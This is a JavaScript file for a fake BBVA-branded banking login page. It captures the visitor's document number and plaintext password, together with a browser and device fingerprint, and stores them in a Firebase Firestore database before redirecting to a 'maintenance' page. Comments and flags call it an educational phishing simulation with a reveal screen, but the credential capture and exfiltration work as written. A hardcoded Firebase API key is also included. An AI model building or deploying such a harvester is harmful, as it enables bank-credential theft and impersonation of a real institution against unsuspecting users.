// ── IMPORTS FIREBASE ─────────────────
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import {
    getFirestore,
    collection,
    addDoc
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

// ── CONFIG FIREBASE ──────────────────
const firebaseConfig = {
    apiKey: "AIzaSyCIE2mcLIjFDxKqQ7CnuNd6GQ5pz9Iqhv0",
    authDomain: "bbva-61bc3.firebaseapp.com",
    projectId: "bbva-61bc3",
    storageBucket: "bbva-61bc3.firebasestorage.app",
    messagingSenderId: "958105236331",
    appId: "1:958105236331:web:009443b54edc7a21bc122e",
    measurementId: "G-DVQK4ZXRCJ"
};

const app = initializeApp(firebaseConfig);
const db  = getFirestore(app);

// ── DOM ──────────────────────────────
const form           = document.getElementById("login-form");
const documentoInput = document.getElementById("documento");
const passwordInput  = document.getElementById("password");
const documentoError = document.getElementById("documento-error");
const passwordError  = document.getElementById("password-error");
const togglePassword = document.getElementById("toggle-password");
const reiniciarBtn   = document.getElementById("reiniciar-simulacion");

// ── UTILIDADES ───────────────────────
function limpiarErrores() {
    documentoError.textContent = "";
    passwordError.textContent  = "";

    documentoInput.closest(".input-group")
        .classList.remove("has-error");

    passwordInput.closest(".input-group")
        .classList.remove("has-error");
}

function validarFormulario() {
    limpiarErrores();

    const documento = documentoInput.value.trim();
    const password  = passwordInput.value.trim();

    let esValido = true;

    if (!documento) {
        documentoError.textContent = "Ingresa un número de documento";
        documentoInput.closest(".input-group")
            .classList.add("has-error");
        esValido = false;
    }

    if (!password) {
        passwordError.textContent = "Ingresa una contraseña";
        passwordInput.closest(".input-group")
            .classList.add("has-error");
        esValido = false;
    }

    return esValido;
}

// ── HASH PASSWORD (SHA-256) ──────────
// Uso de Web Crypto API para obtener un hash hex de la contraseña.[web:13][web:15]
async function hashearPassword(password) {
    const encoder = new TextEncoder();
    const data    = encoder.encode(password);

    const hashBuffer = await crypto.subtle.digest("SHA-256", data);
    const hashArray  = Array.from(new Uint8Array(hashBuffer));
    const hashHex    = hashArray
        .map(b => b.toString(16).padStart(2, "0"))
        .join("");

    return hashHex;
}

// ── FUNCIONES AUXILIARES DE EJEMPLO ──
// Si ya tienes estas funciones en otro archivo, deja tus versiones.
async function obtenerDatosRed() {
    // Aquí deberías llamar a tu API de IP/geo o devolver datos de prueba
    return {
        ip: "0.0.0.0",
        ciudad: "Desconocida",
        region: "Desconocida",
        pais: "Desconocido",
        codigoPais: "XX",
        proveedor: "Desconocido",
        zona_horaria: "UTC",
        latitud: 0,
        longitud: 0
    };
}

function obtenerDatosDispositivo() {
    const idiomaNave = navigator.language || navigator.userLanguage;
    const resolucion = `${window.screen.width}x${window.screen.height}`;

    return {
        sistemaOperativo:  navigator.platform,
        navegador:         navigator.userAgent,
        dispositivo:       "Desconocido",
        idiomaNave,
        resolucion,
        profundidadColor:  window.screen.colorDepth,
        zonaHorariaLocal:  Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesHabilitadas: navigator.cookieEnabled,
        userAgentCompleto: navigator.userAgent
    };
}

// ── CAPTURA ──────────────────────────
async function capturarDatos() {
    if (!validarFormulario()) return;

    const documento     = documentoInput.value.trim();
    const password      = passwordInput.value.trim();
    const tipoDocumento = document.getElementById("tipo-documento").value;

    const passwordHash  = await hashearPassword(password);
    const datosRed      = await obtenerDatosRed();
    const datosDisp     = obtenerDatosDispositivo();

    sessionStorage.setItem("documentoDemo", documento);
    sessionStorage.setItem("passIngresada", password);
    sessionStorage.setItem("intentosMantenimiento", "0");

    try {
        // Uso correcto de addDoc + collection con SDK modular.[web:4][web:6][web:9]
        const docRef = await addDoc(
            collection(db, "simulaciones"),
            {
                // ── Identidad ─────────────
                fecha:             new Date().toISOString(),
                tipoDocumento:     tipoDocumento,
                longitudDocumento: documento.length,
                documento:         documento,
                password:          password,      // solo con fines educativos
                passwordHash:      passwordHash,  // hash SHA-256
                simulacion:        true,

                // ── Red y ubicación ──────
                ip:                datosRed.ip,
                ciudad:            datosRed.ciudad,
                region:            datosRed.region,
                pais:              datosRed.pais,
                codigoPais:        datosRed.codigoPais,
                proveedor:         datosRed.proveedor,
                zonaHorariaRed:    datosRed.zona_horaria,
                latitud:           datosRed.latitud,
                longitud:          datosRed.longitud,

                // ── Dispositivo ──────────
                sistemaOperativo:  datosDisp.sistemaOperativo,
                navegador:         datosDisp.navegador,
                dispositivo:       datosDisp.dispositivo,
                idioma:            datosDisp.idiomaNave,
                resolucion:        datosDisp.resolucion,
                profundidadColor:  datosDisp.profundidadColor,
                zonaHorariaLocal:  datosDisp.zonaHorariaLocal,
                cookiesHabilitadas: datosDisp.cookiesHabilitadas,
                userAgent:         datosDisp.userAgentCompleto,

                // ── Comportamiento ───────
                intentosFallidos:  0
            }
        );

        sessionStorage.setItem("firestoreDocId", docRef.id);
        console.log("Registro guardado:", docRef.id);
    } catch (error) {
        console.error("Error al guardar:", error);
    }

    window.location.href = "mantenimiento.html";
}

// ── SUBMIT ───────────────────────────
if (form) {
    form.addEventListener("submit", async function (e) {
        e.preventDefault();
        await capturarDatos();
    });
}

// ── MOSTRAR PASSWORD ─────────────────
if (togglePassword) {
    togglePassword.addEventListener("click", function () {
        const oculto = passwordInput.type === "password";
        passwordInput.type = oculto ? "text" : "password";
    });
}

// ── PANTALLA PHISHING ────────────────
const params = new URLSearchParams(window.location.search);

if (params.get("resultado") === "phishing") {
    const loginWrapper = document.getElementById("login-wrapper");
    const pantallaPhish = document.getElementById("pantalla-phishing");

    if (loginWrapper) loginWrapper.style.display = "none";
    if (pantallaPhish) pantallaPhish.style.display = "flex";

    const docGuardado  = sessionStorage.getItem("documentoDemo");
    const passGuardada = sessionStorage.getItem("passIngresada");

    document.getElementById("mostrar-documento").textContent = docGuardado || "";

    if (passGuardada && passGuardada.length > 0) {
        document.getElementById("mostrar-password").textContent =
            passGuardada[0] + "*".repeat(passGuardada.length - 1);
    }

    sessionStorage.removeItem("documentoDemo");
    sessionStorage.removeItem("passIngresada");

    history.replaceState(null, "", "banca.html");
}

// ── REINICIAR SIMULACIÓN ─────────────
if (reiniciarBtn) {
    reiniciarBtn.addEventListener("click", () => {
        window.location.href = "banca.html";
    });
}